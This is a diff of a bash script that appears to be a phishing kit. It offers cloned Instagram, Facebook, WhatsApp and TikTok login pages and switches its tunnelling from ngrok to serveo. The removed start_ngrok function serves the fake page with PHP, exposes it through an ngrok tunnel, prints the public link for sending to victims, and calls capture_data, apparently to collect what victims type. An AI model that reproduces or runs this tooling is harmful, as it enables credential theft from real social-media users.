@@ -194,25 +194,25 @@ read -p "$PLAY2" mik
       elif [ "$mik" == "sam instagram.net" ]; then
      website='instagram'
       setup_site
-      start_ngrok 
+      start_serveo 
       
       elif [ "$mik" == "sam facebook.net" ]; then
    printf "\n$mik" >> .history/sam_history.dat
    website='facebook'
    setup_site
-   start_ngrok
+   start_serveo
    
     elif [ "$mik" == "sam whatsapp.net" ]; then
    printf "\n$mik" >> .history/sam_history.dat
    website='whatsapp' 
    setup_site
-   start_ngrok
+   start_serveo
    
       elif [ "$mik" == "sam tiktok.net" ]; then
       printf "\n$mik" >> .history/sam_history.dat
    website='tiktok'
    setup_site
-   start_ngrok
+   start_serveo
       
   elif [ "$mik" == "about" ]; then
   sleep 0.75
@@ -264,27 +264,6 @@ printf "\n"
 echo -e "${WHITE}[-] URL: ${GREEN} $send_url"
 printf "\n"
 capture_data
-}
-
-start_ngrok() {
-    sleep 0.75
-    printf "\n${WHITE}[-] ${WHITEBG} ${BLACK}http://localhost:$PORT ${RESETBG} ${WHITE} Initializing..."
-    cd .server/www && php -S 127.0.0.1:$PORT > /dev/null 2>&1 &
-    sleep 2
-    echo ''
-    if [[ -e .server/www/linksender ]]; then
-        rm -rf .server/www/linksender
-    fi
-
-    ./ngrok http http:\\$HOST:$PORT > /dev/null 2>&1 &
-    sleep 7
-
-    # Obtém a URL do ngrok
-    send_url=$(curl --silent --show-error http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
-    printf "\n"
-    echo -e "${WHITE}[-] URL: ${GREEN} $send_url"
-    printf "\n"
-    capture_data
 }
 
 
